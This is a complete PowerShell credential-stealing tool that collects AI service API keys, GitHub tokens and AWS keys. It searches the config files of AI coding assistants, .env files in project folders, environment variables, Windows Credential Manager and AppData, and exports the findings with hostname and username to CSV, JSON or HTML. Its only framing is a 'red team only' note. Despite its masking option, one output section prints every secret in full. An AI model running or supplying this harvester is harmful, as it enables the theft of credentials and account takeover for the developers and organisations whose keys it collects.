#Requires -Version 5.1
<#
.SYNOPSIS
    Harvests AI model API keys from common configuration locations on Windows.
.DESCRIPTION
    Searches known file paths used by AI coding assistants, LLM tools, and ML frameworks
    to locate stored API keys, tokens, and credentials.
.PARAMETER OutputFile
    Path to export results as CSV.
.PARAMETER OutputJson
    Path to export results as JSON.
.PARAMETER OutputHtml
    Path to export results as HTML report.
.PARAMETER LogFile
    Path to write scan log.
.PARAMETER ScanEnvironmentVars
    Also scan process environment variables.
.PARAMETER ScanProjectRoots
    Recurse into common project directories for .env files.
.PARAMETER ScanCredentialManager
    Query Windows Credential Manager for AI-related entries.
.PARAMETER FilterTool
    Only scan specific tool(s). Comma-separated list.
.PARAMETER ExcludeTool
    Skip specific tool(s). Comma-separated list.
.PARAMETER CustomPaths
    Additional file/directory paths to scan.
.PARAMETER MaxDepth
    Maximum recursion depth for directory scans (default: 5).
.PARAMETER Verbose
    Show detailed scan progress.
.PARAMETER Quiet
    Suppress all console output except errors.
.PARAMETER NoMask
    Show full unmasked key values in console output.
.PARAMETER Timestamp
    Prefix output lines with timestamps.
.PARAMETER IncludeEmpty
    Include keys that appear to be empty or placeholder values.
.NOTES
    For authorized security assessments and red team operations only.
#>

param(
    [string]$OutputFile,
    [string]$OutputJson,
    [string]$OutputHtml,
    [string]$LogFile,
    [switch]$ScanEnvironmentVars,
    [switch]$ScanProjectRoots,
    [switch]$ScanCredentialManager,
    [string[]]$FilterTool,
    [string[]]$ExcludeTool,
    [string[]]$CustomPaths,
    [int]$MaxDepth = 5,
    [switch]$Verbose,
    [switch]$Quiet,
    [switch]$NoMask,
    [switch]$Timestamp,
    [switch]$IncludeEmpty
)

$ErrorActionPreference = "SilentlyContinue"
$Results = [System.Collections.ArrayList]::new()
$ScanStartTime = Get-Date

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = if ($Timestamp) { "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] " } else { "" }
    $logLine = "${ts}[$Level] $Message"

    if (-not $Quiet) {
        switch ($Level) {
            "ERROR"   { Write-Host $logLine -ForegroundColor Red }
            "WARN"    { Write-Host $logLine -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logLine -ForegroundColor Green }
            "INFO"    { if ($Verbose) { Write-Host $logLine -ForegroundColor Cyan } }
            default   { Write-Host $logLine }
        }
    }
    if ($LogFile) {
        $logLine | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
    }
}

function Add-Finding {
    param(
        [string]$Tool,
        [string]$FilePath,
        [string]$KeyType,
        [string]$Value
    )
    if (-not $IncludeEmpty) {
        if (-not $Value -or $Value.Trim() -eq "") { return }
        if ($Value -match "^(placeholder|your-|xxx|example|changeme|<|REPLACE|TODO|FIXME|insert)") { return }
    }
    if ($Value -and $Value.Trim() -ne "") {
        [void]$Results.Add([PSCustomObject]@{
            Tool     = $Tool
            File     = $FilePath
            KeyType  = $KeyType
            Value    = $Value.Trim()
            FoundAt = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        })
    }
}

function Mask-Value {
    param([string]$Value)
    if ($NoMask) { return $Value }
    if ($Value.Length -le 12) { return $Value }
    return $Value.Substring(0, 6) + ("*" * ($Value.Length - 12)) + $Value.Substring($Value.Length - 4)
}

function Test-ToolFilter {
    param([string]$ToolName)
    if ($FilterTool -and $FilterTool.Count -gt 0) {
        return ($FilterTool | Where-Object { $ToolName -match $_ }).Count -gt 0
    }
    if ($ExcludeTool -and $ExcludeTool.Count -gt 0) {
        return ($ExcludeTool | Where-Object { $ToolName -match $_ }).Count -eq 0
    }
    return $true
}

function Read-ConfigFile {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path)) { return $null }
    try {
        return Get-Content -LiteralPath $Path -Raw -ErrorAction Stop
    } catch {
        return $null
    }
}

function Parse-JsonContent {
    param([string]$Content)
    try {
        return $Content | ConvertFrom-Json -ErrorAction Stop
    } catch {
        return $null
    }
}

function Extract-KeysFromJson {
    param(
        [string]$Tool,
        [string]$FilePath,
        $JsonObject
    )
    if ($null -eq $JsonObject) { return }

    $keyPatterns = @(
        "api_key", "apiKey", "API_KEY", "api-key",
        "token", "Token", "TOKEN",
        "secret", "Secret", "SECRET",
        "access_token", "accessToken", "ACCESS_TOKEN",
        "auth_token", "authToken", "AUTH_TOKEN",
        "personal_access_token", "personalAccessToken",
        "anthropic_api_key", "openai_api_key", "cohere_api_key",
        "huggingface_token", "hf_token", "HF_TOKEN",
        "REPLICATE_API_TOKEN", "TOGETHER_API_KEY",
        "GOOGLE_API_KEY", "GEMINI_API_KEY",
        "MISTRAL_API_KEY", "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY", "COHERE_API_KEY",
        "DEEPSEEK_API_KEY", "GROQ_API_KEY"
    )

    $jsonText = $JsonObject | ConvertTo-Json -Depth 10 -ErrorAction SilentlyContinue
    if (-not $jsonText) { return }

    foreach ($pattern in $keyPatterns) {
        $regex = [regex]::Escape($pattern)
        $matches = [regex]::Matches($jsonText, "(?i)`"?$regex`"?\\s*[:=]\\s*[`"]([^`"]+)[`"]")
        foreach ($m in $matches) {
            if ($m.Groups.Count -gt 1) {
                Add-Finding -Tool $Tool -FilePath $FilePath -KeyType $pattern -Value $m.Groups[1].Value
            }
        }
    }
}

function Extract-KeysFromEnv {
    param(
        [string]$Tool,
        [string]$FilePath,
        [string]$Content
    )
    $envKeyPatterns = @(
        "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "COHERE_API_KEY",
        "HUGGING_FACE_HUB_TOKEN", "HF_TOKEN", "HUGGINGFACE_TOKEN",
        "REPLICATE_API_TOKEN", "TOGETHER_API_KEY", "TOGETHER_API_TOKEN",
        "GOOGLE_API_KEY", "GEMINI_API_KEY", "GOOGLE_APPLICATION_CREDENTIALS",
        "MISTRAL_API_KEY", "MISTRAL_API_SECRET",
        "DEEPSEEK_API_KEY", "GROQ_API_KEY", "OPENROUTER_API_KEY",
        "AZURE_OPENAI_API_KEY", "AZURE_API_KEY",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "AI21_API_KEY", "PERPLEXITY_API_KEY",
        "FIREWORKS_API_KEY", "NEBIUS_API_KEY", "SAMBANOVA_API_KEY",
        "VOYAGE_API_KEY", "CLAUDE_API_KEY", "OLLAMA_API_KEY",
        "GITHUB_TOKEN", "GH_TOKEN",
        "AZURE_AI_SEARCH_KEY", "PINECONE_API_KEY",
        "WEAVIATE_API_KEY", "CHROMA_API_KEY",
        "LANGCHAIN_API_KEY", "LANGSMITH_API_KEY",
        "OPENAI_ORG_ID", "OPENAI_ORGID"
    )

    foreach ($key in $envKeyPatterns) {
        $regex = "(?i)(?:^|\s)${key}\s*=\s*[`"']?([^`"'\s#]+)[`"']?"
        $matches = [regex]::Matches($Content, $regex)
        foreach ($m in $matches) {
            if ($m.Groups.Count -gt 1) {
                Add-Finding -Tool $Tool -FilePath $FilePath -KeyType $key -Value $m.Groups[1].Value
            }
        }
    }
}

function Extract-KeysFromToml {
    param(
        [string]$Tool,
        [string]$FilePath,
        [string]$Content
    )
    $tomlKeyPatterns = @(
        "api_key", "token", "secret", "access_token",
        "openai_api_key", "anthropic_api_key", "api_token"
    )
    foreach ($key in $tomlKeyPatterns) {
        $regex = "(?i)${key}\s*=\s*[`"']([^`"']+)[`"']"
        $matches = [regex]::Matches($Content, $regex)
        foreach ($m in $matches) {
            if ($m.Groups.Count -gt 1) {
                Add-Finding -Tool $Tool -FilePath $FilePath -KeyType $key -Value $m.Groups[1].Value
            }
        }
    }
}

function Extract-KeysFromYaml {
    param(
        [string]$Tool,
        [string]$FilePath,
        [string]$Content
    )
    $yamlKeyPatterns = @(
        "api_key", "apiKey", "API_KEY",
        "token", "Token", "TOKEN",
        "anthropic_api_key", "openai_api_key",
        "openai", "anthropic", "api_keys"
    )
    foreach ($key in $yamlKeyPatterns) {
        $regex = "(?i)${key}\s*:\s*[`"']?([^`"'\s#]+)[`"']?"
        $matches = [regex]::Matches($Content, $regex)
        foreach ($m in $matches) {
            if ($m.Groups.Count -gt 1) {
                Add-Finding -Tool $Tool -FilePath $FilePath -KeyType $key -Value $m.Groups[1].Value
            }
        }
    }
}

function Scan-File {
    param(
        [string]$Tool,
        [string]$FilePath
    )
    $content = Read-ConfigFile -Path $FilePath
    if (-not $content) { return }

    $ext = [System.IO.Path]::GetExtension($FilePath).ToLower()
    switch ($ext) {
        ".json" {
            $obj = Parse-JsonContent -Content $content
            if ($obj) { Extract-KeysFromJson -Tool $Tool -FilePath $FilePath -JsonObject $obj }
            else { Extract-KeysFromEnv -Tool $Tool -FilePath $FilePath -Content $content }
        }
        ".toml" { Extract-KeysFromToml -Tool $Tool -FilePath $FilePath -Content $content }
        ".yml"  { Extract-KeysFromYaml -Tool $Tool -FilePath $FilePath -Content $content }
        ".yaml" { Extract-KeysFromYaml -Tool $Tool -FilePath $FilePath -Content $content }
        ".env"  { Extract-KeysFromEnv -Tool $Tool -FilePath $FilePath -Content $content }
        ".cfg"  { Extract-KeysFromEnv -Tool $Tool -FilePath $FilePath -Content $content }
        ".conf" { Extract-KeysFromEnv -Tool $Tool -FilePath $FilePath -Content $content }
        default {
            Extract-KeysFromJson -Tool $Tool -FilePath $FilePath -JsonObject (Parse-JsonContent -Content $content)
            Extract-KeysFromEnv -Tool $Tool -FilePath $FilePath -Content $content
            Extract-KeysFromToml -Tool $Tool -FilePath $FilePath -Content $content
            Extract-KeysFromYaml -Tool $Tool -FilePath $FilePath -Content $content
        }
    }
}

# ============================================================
# Define scan targets
# ============================================================
$UserRoot = $env:USERPROFILE
$AppData = $env:APPDATA
$LocalAppData = $env:LOCALAPPDATA

$ScanTargets = @(
    @{ Tool = "OpenCode";           Paths = @(
        "$AppData\opencode\auth.json",
        "$UserRoot\.opencode\config.json",
        "$UserRoot\.opencode\auth.json"
    )},
    @{ Tool = "Claude Code";        Paths = @(
        "$UserRoot\.claude\settings.json",
        "$UserRoot\.claude\config.json"
    )},
    @{ Tool = "GitHub Copilot";     Paths = @(
        "$AppData\github-copilot\hosts.json",
        "$AppData\GitHub Copilot\hosts.json"
    )},
    @{ Tool = "Codex (OpenAI)";     Paths = @(
        "$UserRoot\.codex\config.toml",
        "$UserRoot\.codex\config.json"
    )},
    @{ Tool = "GPTScript";          Paths = @(
        "$LocalAppData\gptscript\config.json",
        "$AppData\gptscript\config.json"
    )},
    @{ Tool = "Gemini-Code";        Paths = @(
        "$LocalAppData\gemini-code\config.env",
        "$LocalAppData\gemini-code\config.json"
    )},
    @{ Tool = "Aider";              Paths = @(
        "$UserRoot\.aider.conf.yml",
        "$UserRoot\.aider.env"
    )},
    @{ Tool = "Continue.dev";       Paths = @(
        "$UserRoot\.continue\config.json",
        "$UserRoot\.continue\profiles"
    )},
    @{ Tool = "Cody (Sourcegraph)"; Paths = @(
        "$AppData\Sourcegraph\Cody\config.json",
        "$UserRoot\.sourcegraph\cody\config.json"
    )},
    @{ Tool = "Tabby";              Paths = @(
        "$UserRoot\.tabby\config.toml"
    )},
    @{ Tool = "Ollama";             Paths = @(
        "$UserRoot\.ollama\config.json",
        "$UserRoot\.ollama\host"
    )},
    @{ Tool = "LM Studio";          Paths = @(
        "$AppData\LM-Studio\config.json"
    )},
    @{ Tool = "Zotero LLM";         Paths = @(
        "$UserRoot\.zotero-llm\config.json"
    )},
    @{ Tool = "PrivateGPT";         Paths = @(
        "$UserRoot\.env"
    )},
    @{ Tool = "LangChain";          Paths = @(
        "$UserRoot\.env"
    )},
    @{ Tool = "AutoGPT";            Paths = @(
        "$UserRoot\.env"
    )},
    @{ Tool = "gpt4all";            Paths = @(
        "$AppData\gpt4all\config.json"
    )},
    @{ Tool = "RAGFlow";            Paths = @(
        "$UserRoot\.ragflow\.env",
        "$UserRoot\.ragflow\config.json"
    )},
    @{ Tool = "Hugging Face";       Paths = @(
        "$UserRoot\.cache\huggingface\token"
    )},
    @{ Tool = "Replicate";          Paths = @(
        "$AppData\replicate\api_token.json"
    )},
    @{ Tool = "Generic Config";     Paths = @(
        "$UserRoot\.env",
        "$UserRoot\.env.local",
        "$UserRoot\.env.development"
    )}
)

Write-Log "AI API Key Harvester started" "INFO"
Write-Log "MaxDepth=$MaxDepth | NoMask=$NoMask | Verbose=$Verbose | Quiet=$Quiet" "INFO"

# ============================================================
# Scan environment variables
# ============================================================
if ($ScanEnvironmentVars) {
    Write-Log "Scanning environment variables..." "INFO"
    $envVars = @(
        "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "COHERE_API_KEY",
        "HF_TOKEN", "HUGGING_FACE_HUB_TOKEN", "HUGGINGFACE_TOKEN",
        "REPLICATE_API_TOKEN", "TOGETHER_API_KEY", "TOGETHER_API_TOKEN",
        "GOOGLE_API_KEY", "GEMINI_API_KEY", "MISTRAL_API_KEY",
        "DEEPSEEK_API_KEY", "GROQ_API_KEY", "OPENROUTER_API_KEY",
        "AZURE_OPENAI_API_KEY", "AI21_API_KEY", "PERPLEXITY_API_KEY",
        "FIREWORKS_API_KEY", "NEBIUS_API_KEY", "SAMBANOVA_API_KEY",
        "VOYAGE_API_KEY", "CLAUDE_API_KEY",
        "GITHUB_TOKEN", "GH_TOKEN",
        "PINECONE_API_KEY", "WEAVIATE_API_KEY", "CHROMA_API_KEY",
        "LANGCHAIN_API_KEY", "LANGSMITH_API_KEY",
        "OPENAI_ORG_ID", "OPENAI_ORGID"
    )
    foreach ($var in $envVars) {
        $val = [System.Environment]::GetEnvironmentVariable($var, "Process")
        if ($val -and $val.Length -gt 5) {
            Add-Finding -Tool "Environment Variable" -FilePath "ENV:$var" -KeyType $var -Value $val
            Write-Log "Found env var: $var" "SUCCESS"
        }
    }
}

# ============================================================
# Scan project roots for .env files
# ============================================================
if ($ScanProjectRoots) {
    Write-Log "Scanning project directories for .env files (depth=$MaxDepth)..." "INFO"
    $projectDirs = @(
        "$UserRoot\Documents",
        "$UserRoot\Desktop",
        "$UserRoot\Projects",
        "$UserRoot\dev",
        "$UserRoot\code",
        "$UserRoot\repos",
        "$UserRoot\src"
    )
    foreach ($dir in $projectDirs) {
        if (Test-Path -LiteralPath $dir) {
            $envFiles = Get-ChildItem -Path $dir -Filter ".env*" -File -Recurse -Depth $MaxDepth -ErrorAction SilentlyContinue
            foreach ($f in $envFiles) {
                Scan-File -Tool "Project .env" -FilePath $f.FullName
            }
        }
    }
}

# ============================================================
# Scan custom paths
# ============================================================
if ($CustomPaths -and $CustomPaths.Count -gt 0) {
    Write-Log "Scanning custom paths..." "INFO"
    foreach ($cp in $CustomPaths) {
        if (Test-Path -LiteralPath $cp) {
            if (Test-Path -LiteralPath $cp -PathType Container) {
                $childFiles = Get-ChildItem -Path $cp -File -Recurse -Depth $MaxDepth -ErrorAction SilentlyContinue
                foreach ($child in $childFiles) {
                    Scan-File -Tool "Custom Path" -FilePath $child.FullName
                }
            } else {
                Scan-File -Tool "Custom Path" -FilePath $cp
            }
            Write-Log "Scanned custom path: $cp" "INFO"
        } else {
            Write-Log "Custom path not found: $cp" "WARN"
        }
    }
}

# ============================================================
# Scan for Windows Credential Manager entries
# ============================================================
if ($ScanCredentialManager) {
    Write-Log "Scanning Windows Credential Manager..." "INFO"
    try {
        $creds = cmdkey /list 2>$null
        if ($creds) {
            $aiCredPatterns = @("openai", "anthropic", "claude", "copilot", "hugging", "cohere", "gemini", "ollama", "replicate", "together")
            foreach ($line in $creds) {
                foreach ($pat in $aiCredPatterns) {
                    if ($line -match "(?i)$pat") {
                        Add-Finding -Tool "Credential Manager" -FilePath "Windows Credential Manager" -KeyType "Credential" -Value $line.Trim()
                        Write-Log "Found credential: $line" "SUCCESS"
                    }
                }
            }
        }
    } catch {}
}

# ============================================================
# Perform file-based scans
# ============================================================
Write-Log "Scanning known configuration file locations..." "INFO"
foreach ($target in $ScanTargets) {
    if (-not (Test-ToolFilter -ToolName $target.Tool)) {
        Write-Log "Skipping excluded tool: $($target.Tool)" "INFO"
        continue
    }
    foreach ($path in $target.Paths) {
        if (Test-Path -LiteralPath $path) {
            Write-Log "Found config: $path" "SUCCESS"
            Scan-File -Tool $target.Tool -FilePath $path

            if (Test-Path -LiteralPath $path -PathType Container) {
                $childFiles = Get-ChildItem -Path $path -File -Recurse -Depth $MaxDepth -ErrorAction SilentlyContinue
                foreach ($child in $childFiles) {
                    Scan-File -Tool $target.Tool -FilePath $child.FullName
                }
            }
        }
    }
}

# ============================================================
# Regex sweep for API key patterns in user home
# ============================================================
Write-Log "Regex sweep for API key patterns..." "INFO"
$sweepPatterns = @(
    "sk-[a-zA-Z0-9_-]{20,}",
    "sk-ant-[a-zA-Z0-9_-]{20,}",
    "ghp_[a-zA-Z0-9_-]{20,}",
    "gho_[a-zA-Z0-9_-]{20,}",
    "glpat-[a-zA-Z0-9_-]{20,}",
    "hf_[a-zA-Z0-9_-]{20,}",
    "AIza[a-zA-Z0-9_-]{20,}",
    "xai-[a-zA-Z0-9_-]{20,}",
    "AKIA[A-Z0-9]{16}",
    "eyJ[a-zA-Z0-9_-]{50,}"
)

$targetExtensions = @("*.json", "*.toml", "*.yml", "*.yaml", "*.env", "*.cfg", "*.conf", "*.txt", "*.ini")
$searchDirs = @(
    "$UserRoot\.config",
    "$UserRoot\.local",
    "$AppData",
    "$LocalAppData"
)

foreach ($dir in $searchDirs) {
    if (-not (Test-Path -LiteralPath $dir)) { continue }
    foreach ($ext in $targetExtensions) {
        $files = Get-ChildItem -Path $dir -Filter $ext -File -Recurse -Depth $MaxDepth -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = Read-ConfigFile -Path $file.FullName
            if (-not $content) { continue }
            foreach ($pattern in $sweepPatterns) {
                $matches = [regex]::Matches($content, $pattern)
                foreach ($m in $matches) {
                    $val = $m.Value
                    $alreadyFound = $false
                    foreach ($r in $Results) {
                        if ($r.Value -eq $val) { $alreadyFound = $true; break }
                    }
                    if (-not $alreadyFound) {
                        Add-Finding -Tool "Regex Sweep" -FilePath $file.FullName -KeyType "Pattern Match" -Value $val
                        Write-Log "Pattern match in: $($file.FullName)" "SUCCESS"
                    }
                }
            }
        }
    }
}

# ============================================================
# Console Output
# ============================================================
if (-not $Quiet) {
    Write-Host ""
    Write-Host ("=" * 70) -ForegroundColor Yellow
    Write-Host "  AI API KEY HARVEST RESULTS" -ForegroundColor Yellow
    Write-Host ("=" * 70) -ForegroundColor Yellow

    if ($Results.Count -eq 0) {
        Write-Host "`n  [-] No API keys found.`n" -ForegroundColor Red
    } else {
        Write-Host "`n  Total keys found: $($Results.Count)`n" -ForegroundColor Green

        $grouped = $Results | Group-Object -Property Tool
        foreach ($group in $grouped) {
            Write-Host "  [$($group.Name)] ($($group.Count) keys)" -ForegroundColor Cyan
            foreach ($item in $group.Group) {
                $masked = Mask-Value -Value $item.Value
                Write-Host "    File:    $($item.File)" -ForegroundColor Gray
                Write-Host "    Key:     $($item.KeyType)" -ForegroundColor Gray
                Write-Host "    Value:   $masked" -ForegroundColor White
                Write-Host "    Found:   $($item.FoundAt)" -ForegroundColor Gray
                Write-Host ""
            }
        }

        if (-not $NoMask) {
            Write-Host ("=" * 70) -ForegroundColor Yellow
            Write-Host "  Full values (unmasked):" -ForegroundColor Yellow
            Write-Host ("=" * 70) -ForegroundColor Yellow
        }
        foreach ($item in $Results) {
            $displayVal = if ($NoMask) { $item.Value } else { $item.Value }
            Write-Host "  $($item.Tool) | $($item.KeyType) | $($item.File)" -ForegroundColor Gray
            Write-Host "    $($displayVal)`n" -ForegroundColor White
        }
    }
}

# ============================================================
# Export: CSV
# ============================================================
if ($OutputFile) {
    $Results | Export-Csv -Path $OutputFile -NoTypeInformation -ErrorAction SilentlyContinue
    Write-Log "CSV exported: $OutputFile ($($Results.Count) rows)" "SUCCESS"
}

# ============================================================
# Export: JSON
# ============================================================
if ($OutputJson) {
    $jsonExport = @{
        scan_info = @{
            hostname   = $env:COMPUTERNAME
            username   = $env:USERNAME
            scan_date  = $ScanStartTime.ToString("yyyy-MM-dd HH:mm:ss")
            duration   = ((Get-Date) - $ScanStartTime).TotalSeconds.ToString("F2") + "s"
            total_keys = $Results.Count
        }
        keys = $Results | ForEach-Object {
            @{
                tool     = $_.Tool
                file     = $_.File
                key_type = $_.KeyType
                value    = $_.Value
                found_at = $_.FoundAt
            }
        }
    }
    $jsonExport | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputJson -Encoding UTF8 -ErrorAction SilentlyContinue
    Write-Log "JSON exported: $OutputJson" "SUCCESS"
}

# ============================================================
# Export: HTML Report
# ============================================================
if ($OutputHtml) {
    $htmlHead = @"
<!DOCTYPE html>
<html><head><title>AI Key Harvest Report</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
  h1 { color: #e94560; border-bottom: 2px solid #e94560; }
  h2 { color: #0f3460; }
  table { border-collapse: collapse; width: 100%; margin: 10px 0; }
  th { background: #16213e; color: #e94560; padding: 8px; text-align: left; border: 1px solid #333; }
  td { padding: 8px; border: 1px solid #333; }
  tr:nth-child(even) { background: #16213e; }
  .meta { color: #888; font-size: 0.9em; }
  .key-val { color: #4ecca3; word-break: break-all; }
</style></head><body>
<h1>AI API Key Harvest Report</h1>
<div class="meta">
  <p>Hostname: $env:COMPUTERNAME | User: $env:USERNAME | Date: $($ScanStartTime.ToString("yyyy-MM-dd HH:mm:ss"))</p>
  <p>Duration: $(((Get-Date) - $ScanStartTime).TotalSeconds.ToString("F2"))s | Keys Found: $($Results.Count)</p>
</div>
<h2>Findings ($($Results.Count) keys)</h2>
<table><tr><th>Tool</th><th>File</th><th>Key Type</th><th>Value</th><th>Found At</th></tr>
"@
    $htmlRows = ""
    foreach ($item in $Results) {
        $masked = Mask-Value -Value $item.Value
        $htmlRows += "<tr><td>$($item.Tool)</td><td>$($item.File)</td><td>$($item.KeyType)</td><td class='key-val'>$masked</td><td>$($item.FoundAt)</td></tr>`n"
    }
    $htmlFoot = "</table></body></html>"
    ($htmlHead + $htmlRows + $htmlFoot) | Out-File -FilePath $OutputHtml -Encoding UTF8 -ErrorAction SilentlyContinue
    Write-Log "HTML report exported: $OutputHtml" "SUCCESS"
}

# ============================================================
# Summary
# ============================================================
$duration = ((Get-Date) - $ScanStartTime).TotalSeconds
Write-Log "Scan complete. Found $($Results.Count) key(s) in $($duration.ToString('F2'))s" "INFO"
